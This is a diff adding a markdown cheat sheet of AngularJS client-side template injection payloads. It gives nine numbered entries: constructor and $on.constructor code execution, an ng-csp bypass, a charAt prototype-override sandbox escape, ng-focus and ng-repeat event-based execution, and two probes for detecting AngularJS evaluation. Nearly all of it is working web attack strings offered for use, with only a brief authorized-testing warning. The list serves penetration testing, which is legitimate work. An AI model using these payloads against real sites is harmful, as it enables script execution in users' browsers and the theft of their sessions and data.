@@ -1,0 +1,70 @@
+# AngularJS XSS Payloads
+
+Note:
+AngularJS expressions ({{ }}) are evaluated in the browser,
+which can lead to client-side template injection (CSTI).
+
+# Purpose:
+# These payloads exploit AngularJS template injection and expression evaluation.
+
+⚠️ Use only in authorized testing environments.
+
+----------------------------------------
+1. Constructor Execution
+Payload: {{constructor.constructor('alert(1)')()}}
+Description: Uses constructor to execute JavaScript.
+Use Case: Works in AngularJS template injection.
+
+----------------------------------------
+2. $on Constructor
+Payload: {{$on.constructor('alert(1)')()}}
+Description: Executes JS via AngularJS scope function.
+Use Case: Alternative to constructor-based execution.
+
+----------------------------------------
+3. ng-csp Bypass
+Payload: <div ng-app ng-csp>{{x=1;x.toString.constructor('alert(1)')()}}</div>
+Description: Executes JS even with ng-csp enabled.
+Use Case: Bypass AngularJS CSP restrictions.
+
+----------------------------------------
+4. Prototype Manipulation
+Payload: {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+Description: Overrides prototype to inject code.
+Use Case: Advanced template injection bypass.
+
+----------------------------------------
+5. Event-Based Execution
+Payload: <input ng-focus=$event.view.alert(1)>
+Description: Executes on user interaction.
+Use Case: When Angular directives are allowed.
+
+----------------------------------------
+6. Template Injection (ng-app)
+Payload: <div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</div>
+Description: Executes payload inside Angular app scope.
+Use Case: Stored/reflected Angular template injection.
+
+----------------------------------------
+7. ng-repeat Exploit
+Payload:
+<div ng-app ng-csp>
+  <div ng-focus="x=$event;" id=f tabindex=0></div>
+  <div ng-repeat="a in [1]" ng-bind="x.view.alert(1)"></div>
+</div>
+Description: Combines directives for execution.
+Use Case: Complex AngularJS injection scenarios.
+
+----------------------------------------
+8. Expression Injection Test
+Payload: {{1+1}}
+Description: Basic AngularJS expression.
+Use Case: Detect if AngularJS is processing input.
+
+----------------------------------------
+9. Literal Output Test
+Payload: {{ literal }}
+Description: Checks template rendering behavior.
+Use Case: Identifies AngularJS presence.
+
+----------------------------------------
